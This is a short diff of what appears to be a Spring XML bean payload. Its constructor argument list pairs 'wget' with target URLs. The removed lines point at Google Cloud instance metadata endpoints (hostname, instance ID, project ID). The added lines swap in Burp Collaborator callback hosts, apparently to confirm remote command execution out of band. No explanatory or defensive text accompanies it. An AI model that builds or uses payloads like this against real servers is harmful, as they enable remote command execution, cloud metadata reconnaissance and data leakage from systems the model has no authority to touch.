@@ -3,15 +3,15 @@
     <constructor-arg>
       <list>
         <value>wget</value>
-        <value>http://metadata.google.internal/computeMetadata/v1/</value>
+        <value>http://828fwvtc7o0hku20xglbhmql9cf33s.burpcollaborator.net</value>
         <value>wget</value>
-        <value>http://metadata/computeMetadata/v1/</value>
+        <value>http://y9853l02ee77rk9q46s1ocxbg2muaj.burpcollaborator.net</value>
         <value>wget</value>
-        <value>http://metadata.google.internal/computeMetadata/v1/instance/hostname</value>
+        <value>http://y9853l02ee77rk9q46s1ocxbg2muaj.burpcollaborator.net</value>
         <value>wget</value>
-        <value>http://metadata.google.internal/computeMetadata/v1/instance/id</value>
+        <value>http://y9853l02ee77rk9q46s1ocxbg2muaj.burpcollaborator.net</value>
         <value>wget</value>
-        <value>http://metadata.google.internal/computeMetadata/v1/project/project-id</value>
+        <value>http://y9853l02ee77rk9q46s1ocxbg2muaj.burpcollaborator.net</value>
       </list>
     </constructor-arg>
   </bean>
